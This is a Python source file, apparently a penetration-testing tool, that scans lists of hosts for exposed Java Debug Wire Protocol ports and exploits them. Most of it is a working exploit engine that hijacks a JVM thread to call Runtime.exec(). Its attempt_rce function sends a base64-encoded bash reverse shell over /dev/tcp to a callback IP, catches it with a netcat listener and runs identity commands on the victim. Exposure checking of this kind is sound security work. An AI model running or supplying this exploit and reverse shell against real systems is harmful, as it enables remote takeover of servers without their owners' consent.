#!/usr/bin/env python3
"""
jdwp_check.py — JDWP Remote Code Execution Checker

Tests exposed Java Debug Wire Protocol (JDWP) endpoints for:
  1. Port reachability
  2. JDWP handshake confirmation
  3. Remote code execution via integrated JDWP exploit (Runtime.exec)

JDWP is unauthenticated by design. Any externally reachable JDWP port
allows arbitrary code execution as the Java process user.
A confirmed handshake alone is a critical finding.

Usage:
  python3 jdwp_check.py -t targets.txt
  python3 jdwp_check.py -t targets.txt --callback-ip 10.0.0.5 --callback-port 4444
  python3 jdwp_check.py -t targets.txt --handshake-only

Target file format (one per line):
  IP:PORT
  IP:PORT|HOSTNAME
  IP:PORT|HOSTNAME|JAVA_VERSION

Lines starting with # are ignored. Empty lines are skipped.

Requirements:
  - Python 3.8+ (zero pip dependencies)
  - netcat (nc) for catching reverse shells during RCE checks

RCE engine based on jdwp-shellifier by @_hugsy_ (IOActive) ... Love Goes Out <3
https://github.com/IOActive/jdwp-shellifier

Author: ChiZu (https://github.com/G0ldSec)
License: MIT
"""

import argparse
import datetime
import os
import re
import socket
import struct
import subprocess
import sys
import textwrap
import time
import threading
from base64 import b64encode
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional


# ── ANSI colors ──────────────────────────────────────────────────
class C:
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[0;33m"
    BOLD = "\033[1m"
    NC = "\033[0m"

    @classmethod
    def disable(cls):
        cls.RED = cls.GREEN = cls.YELLOW = cls.BOLD = cls.NC = ""


# ── Data classes ─────────────────────────────────────────────────
@dataclass
class Target:
    ip: str
    port: int
    hostname: str = "N/A"
    java_version: str = "unknown"


@dataclass
class Result:
    target: Target
    port_open: bool = False
    handshake_ok: bool = False
    rce_confirmed: bool = False
    rce_proof: str = ""
    details: str = ""


@dataclass
class Stats:
    total: int = 0
    port_open: int = 0
    port_closed: int = 0
    handshake_ok: int = 0
    rce_ok: int = 0
    rce_fail: int = 0
    rce_hosts: list = field(default_factory=list)
    handshake_hosts: list = field(default_factory=list)


# ═══════════════════════════════════════════════════════════════════
#  JDWP Protocol Engine (ported from jdwp-shellifier by @_hugsy_ to python3 by @CHiZu ... Sending Love <3) 
# ═══════════════════════════════════════════════════════════════════

# JDWP protocol constants
JDWP_HANDSHAKE = b"JDWP-Handshake"

REPLY_PACKET_TYPE = 0x80

# Command signatures: (command_set, command)
VERSION_SIG            = (1, 1)
CLASSESBYSIG_SIG       = (1, 2)
ALLCLASSES_SIG         = (1, 3)
ALLTHREADS_SIG         = (1, 4)
IDSIZES_SIG            = (1, 7)
SUSPENDVM_SIG          = (1, 8)
RESUMEVM_SIG           = (1, 9)
CREATESTRING_SIG       = (1, 11)
METHODS_SIG            = (2, 5)
GETVALUES_SIG          = (2, 6)
CLASSOBJECT_SIG        = (2, 11)
INVOKESTATICMETHOD_SIG = (3, 3)
INVOKEMETHOD_SIG       = (9, 6)
STRINGVALUE_SIG        = (10, 1)
THREADNAME_SIG         = (11, 1)
THREADSUSPEND_SIG      = (11, 2)
THREADRESUME_SIG       = (11, 3)
THREADSTATUS_SIG       = (11, 4)
EVENTSET_SIG           = (15, 1)
EVENTCLEAR_SIG         = (15, 2)
EVENTCLEARALL_SIG      = (15, 3)

# Event/type constants
MODKIND_COUNT          = 1
MODKIND_THREADONLY     = 2
MODKIND_CLASSMATCH     = 5
MODKIND_LOCATIONONLY   = 7
EVENT_BREAKPOINT       = 2
SUSPEND_ALL            = 2
INVOKE_SINGLE_THREADED = 2
TAG_OBJECT             = 76
TAG_STRING             = 115
TYPE_CLASS             = 1


class JDWPError(Exception):
    """JDWP protocol error."""


class JDWPClient:
    """
    Pure-Python JDWP client (Python 3.8+).

    Ported from jdwp-shellifier by @_hugsy_ (IOActive).
    All protocol handling uses bytes — no Python 2 artifacts.
    """

    def __init__(self, host: str, port: int, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.methods: dict = {}
        self.fields: dict = {}
        self._id = 0x01
        self.socket: Optional[socket.socket] = None

        # Set by idsizes()
        self.fieldIDSize = 8
        self.methodIDSize = 8
        self.objectIDSize = 8
        self.referenceTypeIDSize = 8
        self.frameIDSize = 8

        # Set by getversion()
        self.vmName = ""
        self.vmVersion = ""
        self.description = ""

        # Set by allclasses()
        self.classes: list = []
        self.threads: Optional[list] = None

    def _create_packet(self, cmdsig: tuple, data: bytes = b"") -> bytes:
        flags = 0x00
        cmdset, cmd = cmdsig
        pktlen = len(data) + 11
        pkt = struct.pack(">IIB", pktlen, self._id, flags)
        pkt += struct.pack(">BB", cmdset, cmd)
        pkt += data
        self._id += 2
        return pkt

    def _read_reply(self) -> bytes:
        header = self._recv_exact(11)
        pktlen, pkt_id, flags, errcode = struct.unpack(">IIBH", header)

        if flags == REPLY_PACKET_TYPE:
            if errcode:
                raise JDWPError(f"JDWP error code {errcode}")

        remaining = pktlen - 11
        if remaining <= 0:
            return b""

        return self._recv_exact(remaining)

    def _recv_exact(self, n: int) -> bytes:
        """Receive exactly n bytes."""
        buf = b""
        while len(buf) < n:
            chunk = self.socket.recv(n - len(buf))
            if not chunk:
                raise JDWPError("Connection closed")
            buf += chunk
        return buf

    def _fmt_size(self, fmt) -> int:
        if fmt == "L" or fmt == 8:
            return 8
        elif fmt == "I" or fmt == 4:
            return 4
        return 0

    def format_value(self, fmt, value: int) -> bytes:
        """Pack a value by format (L/8=uint64, I/4=uint32)."""
        if fmt == "L" or fmt == 8:
            return struct.pack(">Q", value)
        elif fmt == "I" or fmt == 4:
            return struct.pack(">I", value)
        raise JDWPError(f"Unknown format: {fmt}")

    def unformat_value(self, fmt, data: bytes) -> int:
        """Unpack a value by format."""
        if fmt == "L" or fmt == 8:
            return struct.unpack(">Q", data[:8])[0]
        elif fmt == "I" or fmt == 4:
            return struct.unpack(">I", data[:4])[0]
        raise JDWPError(f"Unknown format: {fmt}")

    def _parse_entries(self, buf: bytes, formats: list, explicit: bool = True) -> list:
        """Parse structured JDWP response entries."""
        entries = []
        index = 0

        if explicit:
            nb_entries = struct.unpack(">I", buf[:4])[0]
            buf = buf[4:]
        else:
            nb_entries = 1

        for _ in range(nb_entries):
            data = {}
            for fmt, name in formats:
                if fmt == "L" or fmt == 8:
                    data[name] = struct.unpack(">Q", buf[index:index+8])[0]
                    index += 8
                elif fmt == "I" or fmt == 4:
                    data[name] = struct.unpack(">I", buf[index:index+4])[0]
                    index += 4
                elif fmt == "S":
                    slen = struct.unpack(">I", buf[index:index+4])[0]
                    data[name] = buf[index+4:index+4+slen].decode("utf-8", errors="replace")
                    index += 4 + slen
                elif fmt == "C":
                    data[name] = buf[index]
                    index += 1
                elif fmt == "Z":
                    t = buf[index]
                    if t == TAG_STRING:
                        obj_bytes = buf[index+1:index+1+self.objectIDSize]
                        s = self._solve_string(obj_bytes)
                        data[name] = s
                        index += 1 + self.objectIDSize
                    elif t == 73:  # Integer tag
                        data[name] = struct.unpack(">I", buf[index+1:index+5])[0]
                        index += 5
                    else:
                        data[name] = None
                        index += 1
                else:
                    raise JDWPError(f"Unknown parse format: {fmt}")
            entries.append(data)

        return entries

    def _build_string(self, data: str) -> bytes:
        encoded = data.encode("utf-8")
        return struct.pack(">I", len(encoded)) + encoded

    def _read_string(self, data: bytes) -> str:
        size = struct.unpack(">I", data[:4])[0]
        return data[4:4+size].decode("utf-8", errors="replace")

    # ── Connection lifecycle ─────────────────────────────────────

    def connect(self):
        """Connect and perform JDWP handshake."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        s.connect((self.host, self.port))
        s.sendall(JDWP_HANDSHAKE)

        resp = s.recv(len(JDWP_HANDSHAKE))
        if resp != JDWP_HANDSHAKE:
            s.close()
            raise JDWPError("Handshake failed")

        self.socket = s

    def start(self):
        """Full JDWP init: connect + id sizes + version + class list."""
        self.connect()
        self._idsizes()
        self._getversion()
        self._allclasses()

    def disconnect(self):
        if self.socket:
            try:
                self.socket.close()
            except OSError:
                pass
            self.socket = None

    # ── Protocol queries ─────────────────────────────────────────

    def _idsizes(self):
        self.socket.sendall(self._create_packet(IDSIZES_SIG))
        buf = self._read_reply()
        formats = [
            ("I", "fieldIDSize"), ("I", "methodIDSize"),
            ("I", "objectIDSize"), ("I", "referenceTypeIDSize"),
            ("I", "frameIDSize"),
        ]
        for entry in self._parse_entries(buf, formats, False):
            for name, value in entry.items():
                setattr(self, name, value)

    def _getversion(self):
        self.socket.sendall(self._create_packet(VERSION_SIG))
        buf = self._read_reply()
        formats = [
            ("S", "description"), ("I", "jdwpMajor"), ("I", "jdwpMinor"),
            ("S", "vmVersion"), ("S", "vmName"),
        ]
        for entry in self._parse_entries(buf, formats, False):
            for name, value in entry.items():
                setattr(self, name, value)

    def _allclasses(self):
        if self.classes:
            return self.classes
        self.socket.sendall(self._create_packet(ALLCLASSES_SIG))
        buf = self._read_reply()
        formats = [
            ("C", "refTypeTag"),
            (self.referenceTypeIDSize, "refTypeId"),
            ("S", "signature"),
            ("I", "status"),
        ]
        self.classes = self._parse_entries(buf, formats)
        return self.classes

    def _allthreads(self):
        if self.threads is not None:
            return self.threads
        self.socket.sendall(self._create_packet(ALLTHREADS_SIG))
        buf = self._read_reply()
        formats = [(self.objectIDSize, "threadId")]
        self.threads = self._parse_entries(buf, formats)
        return self.threads

    def get_class_by_name(self, name: str):
        for entry in self.classes:
            if entry["signature"].lower() == name.lower():
                return entry
        return None

    def get_methods(self, ref_type_id: int) -> list:
        if ref_type_id not in self.methods:
            ref_id = self.format_value(self.referenceTypeIDSize, ref_type_id)
            self.socket.sendall(self._create_packet(METHODS_SIG, data=ref_id))
            buf = self._read_reply()
            formats = [
                (self.methodIDSize, "methodId"),
                ("S", "name"),
                ("S", "signature"),
                ("I", "modBits"),
            ]
            self.methods[ref_type_id] = self._parse_entries(buf, formats)
        return self.methods[ref_type_id]

    def get_method_by_name(self, name: str):
        for ref_id in self.methods:
            for entry in self.methods[ref_id]:
                if entry["name"].lower() == name.lower():
                    return entry
        return None

    def _get_thread_by_name(self, name: str):
        self._allthreads()
        for t in self.threads:
            thread_id = self.format_value(self.objectIDSize, t["threadId"])
            self.socket.sendall(self._create_packet(THREADNAME_SIG, data=thread_id))
            buf = self._read_reply()
            if buf and self._read_string(buf) == name:
                return t
        return None

    def createstring(self, data: str) -> list:
        buf = self._build_string(data)
        self.socket.sendall(self._create_packet(CREATESTRING_SIG, data=buf))
        resp = self._read_reply()
        return self._parse_entries(resp, [(self.objectIDSize, "objId")], False)

    def _solve_string(self, obj_id_bytes: bytes) -> str:
        self.socket.sendall(self._create_packet(STRINGVALUE_SIG, data=obj_id_bytes))
        buf = self._read_reply()
        if buf:
            return self._read_string(buf)
        return ""

    def suspendvm(self):
        self.socket.sendall(self._create_packet(SUSPENDVM_SIG))
        self._read_reply()

    def resumevm(self):
        self.socket.sendall(self._create_packet(RESUMEVM_SIG))
        self._read_reply()

    def invokestatic(self, class_id: int, thread_id: int, meth_id: int, *args) -> bytes:
        data = self.format_value(self.referenceTypeIDSize, class_id)
        data += self.format_value(self.objectIDSize, thread_id)
        data += self.format_value(self.methodIDSize, meth_id)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)
        self.socket.sendall(self._create_packet(INVOKESTATICMETHOD_SIG, data=data))
        return self._read_reply()

    def invoke(self, obj_id: int, thread_id: int, class_id: int, meth_id: int, *args) -> bytes:
        data = self.format_value(self.objectIDSize, obj_id)
        data += self.format_value(self.objectIDSize, thread_id)
        data += self.format_value(self.referenceTypeIDSize, class_id)
        data += self.format_value(self.methodIDSize, meth_id)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)
        self.socket.sendall(self._create_packet(INVOKEMETHOD_SIG, data=data))
        return self._read_reply()

    def send_event(self, event_code: int, *args) -> int:
        data = bytes([event_code])
        data += bytes([SUSPEND_ALL])
        data += struct.pack(">I", len(args))
        for kind, option in args:
            data += bytes([kind])
            data += option
        self.socket.sendall(self._create_packet(EVENTSET_SIG, data=data))
        buf = self._read_reply()
        return struct.unpack(">I", buf)[0]

    def clear_event(self, event_code: int, request_id: int):
        data = bytes([event_code])
        data += struct.pack(">I", request_id)
        self.socket.sendall(self._create_packet(EVENTCLEAR_SIG, data=data))
        self._read_reply()

    def wait_for_event(self) -> bytes:
        return self._read_reply()

    def parse_event_breakpoint(self, buf: bytes, event_id: int):
        """Parse breakpoint event, return (requestId, threadId) or None."""
        if len(buf) < 10 + self.objectIDSize:
            return None
        request_id = struct.unpack(">I", buf[6:10])[0]
        if request_id != event_id:
            return None
        thread_id = self.unformat_value(self.objectIDSize, buf[10:10+self.objectIDSize])
        return request_id, thread_id

    @property
    def version(self) -> str:
        return f"{self.vmName} - {self.vmVersion}"


# ═══════════════════════════════════════════════════════════════════
#  RCE Engine — Runtime.exec() via JDWP breakpoint hijack
# ═══════════════════════════════════════════════════════════════════

def jdwp_exec_command(
    host: str,
    port: int,
    command: str,
    break_on: str = "java.lang.String.valueOf",
    timeout: int = 10,
    log=None,
) -> tuple[bool, str]:
    """
    Execute a command on a remote JVM via JDWP Runtime.exec().

    Sets a breakpoint on a frequently called method, waits for it
    to fire, then hijacks the thread to call Runtime.getRuntime().exec().

    Returns: (success: bool, details: str)
    """
    log = log or (lambda msg: None)

    # Parse break-on class and method
    dot_idx = break_on.rfind(".")
    if dot_idx == -1:
        return False, "Invalid break-on format"
    break_method = break_on[dot_idx+1:]
    break_class = "L" + break_on[:dot_idx].replace(".", "/") + ";"

    cli = JDWPClient(host, port, timeout=timeout)

    try:
        log(f"        Connecting JDWP client...")
        cli.start()
        log(f"        JVM: {cli.version}")

        # 1. Find Runtime class
        runtime_class = cli.get_class_by_name("Ljava/lang/Runtime;")
        if runtime_class is None:
            return False, "Cannot find java.lang.Runtime"
        log(f"        Found Runtime class: id={runtime_class['refTypeId']:#x}")

        # 2. Find getRuntime() method
        cli.get_methods(runtime_class["refTypeId"])
        get_runtime_meth = cli.get_method_by_name("getRuntime")
        if get_runtime_meth is None:
            return False, "Cannot find Runtime.getRuntime()"
        log(f"        Found Runtime.getRuntime(): id={get_runtime_meth['methodId']:#x}")

        # 3. Set breakpoint on frequently called method
        bp_class = cli.get_class_by_name(break_class)
        if bp_class is None:
            return False, f"Cannot find breakpoint class: {break_on}"

        cli.get_methods(bp_class["refTypeId"])
        bp_method = cli.get_method_by_name(break_method)
        if bp_method is None:
            return False, f"Cannot find breakpoint method: {break_on}"

        loc = bytes([TYPE_CLASS])
        loc += cli.format_value(cli.referenceTypeIDSize, bp_class["refTypeId"])
        loc += cli.format_value(cli.methodIDSize, bp_method["methodId"])
        loc += struct.pack(">II", 0, 0)

        event_id = cli.send_event(EVENT_BREAKPOINT, (MODKIND_LOCATIONONLY, loc))
        log(f"        Breakpoint set: event_id={event_id:#x}")

        # 4. Resume VM and wait for breakpoint
        cli.resumevm()
        log(f"        Waiting for breakpoint on {break_on}...")

        # Wait with timeout
        cli.socket.settimeout(timeout)
        thread_id = None
        try:
            while True:
                buf = cli.wait_for_event()
                ret = cli.parse_event_breakpoint(buf, event_id)
                if ret is not None:
                    _, thread_id = ret
                    break
        except socket.timeout:
            return False, f"Breakpoint timeout ({timeout}s) — method may not be called"

        log(f"        Breakpoint hit! thread={thread_id:#x}")
        cli.clear_event(EVENT_BREAKPOINT, event_id)

        # 5. Execute command via Runtime.exec()
        log(f"        Executing: {command}")

        cmd_obj_ids = cli.createstring(command)
        if not cmd_obj_ids:
            return False, "Failed to allocate command string"
        cmd_obj_id = cmd_obj_ids[0]["objId"]

        # Get Runtime instance
        buf = cli.invokestatic(
            runtime_class["refTypeId"],
            thread_id,
            get_runtime_meth["methodId"],
        )
        if not buf or buf[0] != TAG_OBJECT:
            return False, "Runtime.getRuntime() returned unexpected type"

        rt = cli.unformat_value(cli.objectIDSize, buf[1:1+cli.objectIDSize])
        if not rt:
            return False, "Runtime.getRuntime() returned null"

        log(f"        Runtime context: id={rt:#x}")

        # Find exec(String) method
        exec_meth = cli.get_method_by_name("exec")
        if exec_meth is None:
            return False, "Cannot find Runtime.exec()"

        # Call exec()
        data = bytes([TAG_OBJECT]) + cli.format_value(cli.objectIDSize, cmd_obj_id)
        buf = cli.invoke(
            rt, thread_id,
            runtime_class["refTypeId"],
            exec_meth["methodId"],
            data,
        )
        if not buf or buf[0] != TAG_OBJECT:
            return False, "Runtime.exec() returned unexpected type"

        cli.resumevm()
        return True, "Runtime.exec() successful"

    except JDWPError as e:
        return False, f"JDWP error: {e}"
    except socket.error as e:
        return False, f"Connection error: {e}"
    except Exception as e:
        return False, f"Unexpected error: {e}"
    finally:
        cli.disconnect()


# ═══════════════════════════════════════════════════════════════════
#  Scanner Logic
# ═══════════════════════════════════════════════════════════════════

# ── Target parsing ───────────────────────────────────────────────
def parse_targets(filepath: str) -> list[Target]:
    """Parse target file. Format: IP:PORT[|HOSTNAME[|JAVA_VERSION]]"""
    targets = []
    path = Path(filepath)
    if not path.exists():
        print(f"{C.RED}[!] Target file not found: {filepath}{C.NC}")
        sys.exit(1)

    for lineno, raw_line in enumerate(path.read_text().splitlines(), 1):
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue

        parts = line.split("|")
        ipport = parts[0].strip()

        if ":" not in ipport:
            print(f"{C.YELLOW}[!] Skipping line {lineno} (no port): {line}{C.NC}")
            continue

        ip, port_str = ipport.rsplit(":", 1)
        try:
            port = int(port_str)
        except ValueError:
            print(f"{C.YELLOW}[!] Skipping line {lineno} (invalid port): {line}{C.NC}")
            continue

        hostname = parts[1].strip() if len(parts) > 1 else "N/A"
        java_ver = parts[2].strip() if len(parts) > 2 else "unknown"
        targets.append(Target(ip=ip, port=port, hostname=hostname, java_version=java_ver))

    if not targets:
        print(f"{C.RED}[!] No valid targets found in {filepath}{C.NC}")
        sys.exit(1)

    return targets


# ── Network helpers ──────────────────────────────────────────────
def check_port(ip: str, port: int, timeout: int = 5) -> bool:
    """TCP connect check."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def check_jdwp_handshake(ip: str, port: int, timeout: int = 5) -> bool:
    """Send JDWP-Handshake and check for echo response."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.sendall(b"JDWP-Handshake")
            response = s.recv(64)
            return b"JDWP-Handshake" in response
    except (socket.timeout, ConnectionRefusedError, OSError, BrokenPipeError):
        return False


def detect_callback_ip(target_ip: str) -> Optional[str]:
    """Auto-detect the local IP used to route to the target network."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target_ip, 1))
            return s.getsockname()[0]
    except OSError:
        return None


# ── RCE check with integrated JDWP engine ───────────────────────
def attempt_rce(
    target: Target,
    callback_ip: str,
    callback_port: int,
    rce_timeout: int = 15,
    shell_wait: int = 5,
    break_on: str = "java.lang.String.valueOf",
    logger=None,
) -> tuple[bool, str, str]:
    """
    Attempt RCE via integrated JDWP exploit with reverse shell.

    1. Start a netcat listener
    2. Connect via JDWP, set breakpoint, hijack thread
    3. Execute Runtime.exec() with base64-encoded reverse shell
    4. Check listener for incoming connection

    Returns: (success: bool, proof_type: str, details: str)
    """
    log = logger or (lambda msg: None)

    # Build reverse shell payload with base64 Runtime.exec() bypass
    revshell = f"bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1"
    revshell_b64 = b64encode(revshell.encode()).decode()
    rce_cmd = f"bash -c {{echo,{revshell_b64}}}|{{base64,-d}}|bash"

    log(f"        Payload: {rce_cmd}")

    # Start netcat listener in background
    callback_log = f"/tmp/jdwp_shell_{target.ip}_{target.port}.log"
    try:
        os.remove(callback_log)
    except FileNotFoundError:
        pass

    listener_cmd = (
        f'echo "id && hostname && whoami && echo JDWP_RCE_CONFIRMED && exit" | '
        f"nc -nlvp {callback_port} 2>&1"
    )
    listener_timeout = rce_timeout + shell_wait + 10

    with open(callback_log, "w") as logf:
        listener_proc = subprocess.Popen(
            ["bash", "-c", f"timeout {listener_timeout} bash -c '{listener_cmd}'"],
            stdout=logf,
            stderr=subprocess.STDOUT,
        )

    time.sleep(1)

    # Run integrated JDWP exploit
    success, details = jdwp_exec_command(
        host=target.ip,
        port=target.port,
        command=rce_cmd,
        break_on=break_on,
        timeout=rce_timeout,
        log=log,
    )

    if success:
        log(f"        {C.GREEN}Runtime.exec() succeeded — waiting for shell...{C.NC}")
    else:
        log(f"        {C.YELLOW}Exploit: {details}{C.NC}")

    # Wait for possible callback
    log(f"        Waiting {shell_wait}s for reverse shell...")
    time.sleep(shell_wait)

    # Stop listener and read results
    _cleanup_listener(listener_proc, callback_log=None)

    callback_data = ""
    try:
        callback_data = Path(callback_log).read_text()
    except FileNotFoundError:
        pass

    try:
        os.remove(callback_log)
    except FileNotFoundError:
        pass

    # Evaluate callback
    if "JDWP_RCE_CONFIRMED" in callback_data:
        return True, "SHELL", callback_data

    if "uid=" in callback_data:
        return True, "ID", callback_data

    match = re.search(r"from \(UNKNOWN\) \[([^\]]+)\]", callback_data)
    if match and match.group(1) == target.ip:
        return True, "CALLBACK", callback_data

    if re.search(r"connect to.*from", callback_data, re.I):
        return False, "", "callback from unexpected IP"

    if success:
        return False, "", "exec() succeeded but no callback (firewall?)"

    return False, "", details or "no callback received"


def _cleanup_listener(proc: subprocess.Popen, callback_log: Optional[str] = None):
    """Terminate listener process and optionally remove log."""
    try:
        proc.terminate()
        proc.wait(timeout=3)
    except (ProcessLookupError, subprocess.TimeoutExpired):
        try:
            proc.kill()
        except ProcessLookupError:
            pass
    if callback_log:
        try:
            os.remove(callback_log)
        except FileNotFoundError:
            pass


# ── Logging ──────────────────────────────────────────────────────
class Logger:
    def __init__(self, logfile: str):
        self.logfile = logfile
        self._fh = open(logfile, "w")

    def log(self, msg: str = ""):
        print(msg)
        clean = re.sub(r"\033\[[0-9;]*m", "", msg)
        self._fh.write(clean + "\n")
        self._fh.flush()

    def close(self):
        self._fh.close()


# ── Main scan logic ──────────────────────────────────────────────
def run_scan(args: argparse.Namespace):
    targets = parse_targets(args.targets)
    stats = Stats(total=len(targets))

    # Resolve callback IP
    callback_ip = args.callback_ip
    if not callback_ip and not args.handshake_only:
        callback_ip = detect_callback_ip(targets[0].ip)
        if not callback_ip:
            print(f"{C.RED}[!] Could not auto-detect callback IP.{C.NC}")
            print(f"    Use --callback-ip YOUR_IP or --handshake-only")
            sys.exit(1)

    logfile = f"jdwp_results_{datetime.datetime.now():%Y%m%d_%H%M%S}.txt"
    logger = Logger(logfile)
    log = logger.log

    # Header
    log("")
    log(f"{C.BOLD}     ╦╔╦╗╦ ╦╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗{C.NC}")
    log(f"{C.BOLD}     ║ ║║║║║╠═╝  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝{C.NC}")
    log(f"{C.BOLD}    ╚╝═╩╝╚╩╝╩    ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═{C.NC}")
    log(f"                              {C.RED}by ChiZu{C.NC}")
    log(f"     github.com/G0ldSec")
    log(f"{'─' * 50}")
    log(f"  Date       : {datetime.datetime.now():%Y-%m-%d %H:%M:%S}")
    log(f"  Targets    : {stats.total} JDWP endpoints")
    if not args.handshake_only:
        log(f"  Callback   : {callback_ip}:{args.callback_port}")
        log(f"  Timeout    : {args.timeout}s per target")
        log(f"  Break-on   : {args.break_on}")
    else:
        log(f"  Mode       : Handshake-only (no RCE attempts)")
    log(f"{'=' * 70}")
    log("")

    # Main loop
    for i, target in enumerate(targets, 1):
        log(f"{'─' * 70}")
        log(f"{C.BOLD}[{i}/{stats.total}] {target.ip}:{target.port}{C.NC}  "
            f"({target.hostname}, Java {target.java_version})")
        log(f"{'─' * 70}")

        # Step 1: Port check
        step_count = "2" if args.handshake_only else "3"
        log(f"  [1/{step_count}] Port check...")
        if not check_port(target.ip, target.port, timeout=args.connect_timeout):
            log(f"  {C.RED}✗ Port closed{C.NC}")
            stats.port_closed += 1
            log("")
            continue

        log(f"  {C.GREEN}✓ Port open{C.NC}")
        stats.port_open += 1

        # Step 2: JDWP handshake
        log(f"  [2/{step_count}] JDWP handshake...")
        if check_jdwp_handshake(target.ip, target.port, timeout=args.connect_timeout):
            log(f"  {C.GREEN}✓ JDWP handshake confirmed{C.NC}")
            stats.handshake_ok += 1
            stats.handshake_hosts.append(target)
        else:
            log(f"  {C.YELLOW}⚠ No handshake (busy/not JDWP){C.NC}")

        if args.handshake_only:
            log("")
            if i < stats.total:
                time.sleep(args.pause)
            continue

        time.sleep(args.pause)

        # Step 3: RCE via integrated JDWP exploit
        log(f"  [3/3] Reverse shell attempt (integrated engine)...")
        success, proof, details = attempt_rce(
            target=target,
            callback_ip=callback_ip,
            callback_port=args.callback_port,
            rce_timeout=args.timeout,
            shell_wait=args.shell_wait,
            break_on=args.break_on,
            logger=log,
        )

        if success:
            log("")
            log(f"  {C.RED}{C.BOLD}{'=' * 46}{C.NC}")
            log(f"  {C.RED}{C.BOLD}  RCE CONFIRMED — Proof: {proof}{C.NC}")
            log(f"  {C.RED}{C.BOLD}{'=' * 46}{C.NC}")
            if details:
                for line in details.splitlines():
                    line = line.strip()
                    if line and not re.match(r"^(nc:|listening)", line, re.I):
                        log(f"        {C.RED}{line}{C.NC}")
            stats.rce_ok += 1
            stats.rce_hosts.append((target, proof))
        else:
            if details:
                log(f"  {C.YELLOW}⚠ {details}{C.NC}")
            else:
                log(f"  {C.YELLOW}⚠ No callback / no shell received{C.NC}")
            stats.rce_fail += 1

        log("")
        if i < stats.total:
            time.sleep(args.pause)

    # Summary
    log("")
    log(f"{C.BOLD}{'=' * 70}{C.NC}")
    log(f"{C.BOLD}  SUMMARY{C.NC}")
    log(f"{C.BOLD}{'=' * 70}{C.NC}")
    log(f"  Tested               : {stats.total}")
    log(f"  Port open            : {stats.port_open}")
    log(f"  Handshake confirmed  : {stats.handshake_ok}")
    if not args.handshake_only:
        log(f"  RCE confirmed        : {stats.rce_ok}")
        log(f"  No RCE proof         : {stats.rce_fail}")
    log(f"  Port closed          : {stats.port_closed}")
    log(f"{'=' * 70}")

    if stats.rce_hosts:
        log("")
        log(f"{C.RED}{C.BOLD}Hosts with confirmed RCE:{C.NC}")
        log(f"{'─' * 70}")
        log(f"  {'IP':<18} {'Port':<8} {'Hostname':<30} {'Java':<10} {'Proof'}")
        log(f"  {'─'*17} {'─'*7} {'─'*29} {'─'*9} {'─'*6}")
        for target, proof in stats.rce_hosts:
            log(f"  {target.ip:<18} {target.port:<8} {target.hostname:<30} "
                f"{target.java_version:<10} {proof}")

    if stats.handshake_hosts:
        log("")
        log(f"{C.YELLOW}{C.BOLD}All hosts with JDWP handshake (externally exposed):{C.NC}")
        log(f"{'─' * 70}")
        log(f"  {'IP':<18} {'Port':<8} {'Hostname':<35} {'Java'}")
        log(f"  {'─'*17} {'─'*7} {'─'*34} {'─'*9}")
        for t in stats.handshake_hosts:
            log(f"  {t.ip:<18} {t.port:<8} {t.hostname:<35} {t.java_version}")

    log("")
    log(f"{C.BOLD}Note:{C.NC} JDWP is unauthenticated by design. Any externally reachable")
    log(f"JDWP port allows arbitrary code execution as the Java process user.")
    log(f"A confirmed handshake is a critical finding, even without shell proof.")
    log("")
    log(f"Log: {os.path.abspath(logfile)}")

    logger.close()

    # Exit code: 2 = RCE found, 1 = handshake found, 0 = clean
    if stats.rce_ok > 0:
        sys.exit(2)
    elif stats.handshake_ok > 0:
        sys.exit(1)
    sys.exit(0)


# ── CLI ──────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="JDWP Remote Code Execution Checker",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Target file format (one per line):
              IP:PORT
              IP:PORT|HOSTNAME
              IP:PORT|HOSTNAME|JAVA_VERSION

            Examples:
              %(prog)s -t targets.txt
              %(prog)s -t targets.txt --callback-ip 10.0.0.5 --callback-port 4444
              %(prog)s -t targets.txt --handshake-only

            Exit codes:
              0 = No JDWP exposure found
              1 = JDWP handshake confirmed (critical)
              2 = Remote code execution confirmed (critical)
        """),
    )

    parser.add_argument(
        "-t", "--targets", required=True,
        help="Path to target file (one IP:PORT per line)",
    )
    parser.add_argument(
        "--callback-ip", default=None,
        help="Your IP for reverse shell callbacks (auto-detected if omitted)",
    )
    parser.add_argument(
        "--callback-port", type=int, default=44444,
        help="Port for reverse shell listener (default: 44444)",
    )
    parser.add_argument(
        "--break-on", default="java.lang.String.valueOf",
        help="Java method to set breakpoint on (default: java.lang.String.valueOf)",
    )
    parser.add_argument(
        "--timeout", type=int, default=15,
        help="JDWP exploit timeout in seconds (default: 15)",
    )
    parser.add_argument(
        "--connect-timeout", type=int, default=5,
        help="TCP connect timeout in seconds (default: 5)",
    )
    parser.add_argument(
        "--shell-wait", type=int, default=5,
        help="Seconds to wait for reverse shell connect (default: 5)",
    )
    parser.add_argument(
        "--pause", type=int, default=5,
        help="Pause between targets in seconds (default: 5)",
    )
    parser.add_argument(
        "--handshake-only", action="store_true",
        help="Only check for JDWP handshake, skip RCE attempts",
    )
    parser.add_argument(
        "--no-color", action="store_true",
        help="Disable colored output",
    )

    args = parser.parse_args()

    if args.no_color:
        C.disable()

    run_scan(args)


if __name__ == "__main__":
    main()
